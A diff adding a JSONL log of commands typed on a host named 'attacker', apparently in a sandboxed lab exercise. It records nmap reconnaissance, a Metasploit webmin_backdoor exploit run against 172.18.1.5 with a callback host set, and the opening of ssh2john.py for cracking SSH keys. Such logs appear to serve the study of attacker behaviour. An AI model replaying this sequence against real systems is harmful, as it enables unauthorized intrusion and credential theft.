@@ -1,0 +1,36 @@
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:22:31.997Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"ipconfig","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:22:39.673Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"ifconfig","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:24:04.530Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"ip a","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:25:09.037Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"clear","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:25:13.605Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"nmap --help","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:26:02.041Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"nmap 172.18.1.5","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:28:21.296Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"nmap 172.18.1.5 -sV","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:29:04.240Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"nmap -sV","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:30:12.305Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"nmap -sV 172.18.1.5","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:31:27.341Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"clear","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:31:28.821Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"nmap -sV 172.18.1.5","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:36:45.978Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"ssh root@172.18.1.5","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:39:11.714Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"search vsftpd","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:40:19.943Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"msfconsole","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:41:30.658Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"show","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:47:34.744Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"msfcli exploit/unix","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:47:34.744Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"exit","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:47:34.745Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"msfconsole -q","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:47:34.745Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"ls","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:47:34.745Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"use exploit/unix","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:47:34.746Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"exit","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:47:34.746Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"show options","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:49:21.557Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"msfconsole","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:49:35.804Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"search webmin","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:49:59.954Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"use exploit/unix/webapp/webmin_backdoor","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:50:07.208Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"show options","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:50:49.806Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"set RHOST 172.18.1.5","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:51:29.060Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"set RPORT 10000","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:51:40.483Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"set LHOST 10.1.135.83","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:51:44.958Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"check","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T14:56:37.056Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"exploit","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T15:02:33.186Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"run","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T15:05:46.704Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"exit","pool_id":"5","cmd_type":"msf-command"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T15:05:47.774Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"ls","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T15:05:50.149Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"nano ssh2john.py","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","timestamp_str":"2021-04-22T15:06:04.619Z","ip":"10.1.135.83","sandbox_id":"23","cmd":"ls","pool_id":"5","wd":"/root","cmd_type":"bash-command","username":"root"}
